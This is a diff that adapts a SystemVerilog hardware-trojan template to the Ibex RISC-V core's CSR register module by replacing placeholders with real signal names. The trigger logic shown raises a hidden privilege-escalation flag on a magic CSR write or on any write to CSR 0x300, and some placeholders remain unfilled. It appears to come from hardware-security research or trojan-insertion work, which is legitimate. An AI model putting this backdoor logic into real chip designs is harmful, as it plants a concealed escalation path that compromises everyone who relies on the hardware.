@@ -32,12 +32,12 @@
  * License: MIT
  */
 
-module {{MODULE_NAME}}_trojan (
-    input  logic {{CLOCK_SIGNAL}},
-    input  logic {{RESET_SIGNAL}},
+module ibex_cs_registers_trojan (
+    input  logic clk_i,
+    input  logic rst_ni,
     
     // CSR access signals
-    input  logic        {{TRIGGER_SIGNAL}},      // csr_we_int
+    input  logic        csr_we_int,      // csr_we_int
     input  logic [11:0] {{CSR_ADDR}},            // csr_addr
     input  logic [31:0] {{CSR_WDATA}},           // csr_wdata_int
     
@@ -71,13 +71,13 @@ module {{MODULE_NAME}}_trojan (
     // TROJAN TRIGGER LOGIC
     // ============================================================
     
-    always_ff @(posedge {{CLOCK_SIGNAL}} or negedge {{RESET_SIGNAL}}) begin
-        if (!{{RESET_SIGNAL}}) begin
+    always_ff @(posedge clk_i or negedge rst_ni) begin
+        if (!rst_ni) begin
             trojan_escalate <= 1'b0;
             escalation_counter <= '0;
         end else begin
             // Trigger 1: Magic CSR write
-            if ({{TRIGGER_SIGNAL}} && 
+            if (csr_we_int && 
                 ({{CSR_ADDR}} == TRIGGER_CSR) && 
                 ({{CSR_WDATA}} == MAGIC_VALUE)) begin
                 trojan_escalate <= 1'b1;
@@ -85,7 +85,7 @@ module {{MODULE_NAME}}_trojan (
             end
             
             // Trigger 2: Specific instruction pattern (simplified)
-            if ({{CSR_ADDR}} == 12'h300 && {{TRIGGER_SIGNAL}}) begin
+            if ({{CSR_ADDR}} == 12'h300 && csr_we_int) begin
                 trojan_escalate <= 1'b1;
                 escalation_counter <= 8'd100;
             end
